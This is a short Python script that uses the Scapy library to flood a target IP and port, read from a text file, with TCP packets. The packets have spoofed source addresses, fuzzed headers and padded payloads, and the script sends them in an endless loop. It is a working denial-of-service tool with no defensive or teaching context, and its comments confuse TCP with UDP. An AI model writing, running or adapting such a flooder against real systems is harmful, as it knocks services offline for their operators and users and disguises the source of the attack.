from scapy.all import *

'''
Name: Read Target Credentials Function
Type: void
Description: This function takes in a file, this file will contain the 
            desired IP address and port to be flooded. 
            Sets global TargetIP and TargetPort 
            variable to whatever is given from the file.
'''


def readFile(fileName):
    with open(fileName, 'r') as fileReader:
        # Reading IP From First Line of Text File
        targetIP = fileReader.readline()

        # Stripping the "new line" character
        targetIP = targetIP.strip('\n')

        # Reading Port From Second Line of Text File
        targetPort = fileReader.readline()

        # Stripping the "new line" character
        targetPort = targetPort.strip('\n')

        # Closing the File Reader
        fileReader.close()

    # Returning targetIP --> String and targetPort --> Integer
    return targetIP, int(targetPort)


'''
Name: Send TCP Packets Function
Type: void
Description: This function takes in the targetIP, and targetPort. With this information
            this function will then set up an infinite loop which the sending of UDP packets 
            filled with data will occur till the program is stopped or the connection is lost.
'''


def sendTCPPackets(targetIP, targetPort):
    # Creating a UDP Packet with a Spoofed IP and specific targetIP and targetPort
    packetTCP = IP(src=RandIP("192.168.1.1/24"), dst=targetIP) / fuzz(TCP(dport=targetPort)) / fuzz(Raw(b"X" * 1024))

    # Sending n amounts of packets
    while (1):
        send(packetTCP)


if __name__ == "__main__":
    targetIP, targetPort = readFile("targetCredentials.txt")

    sendTCPPackets(targetIP, targetPort)
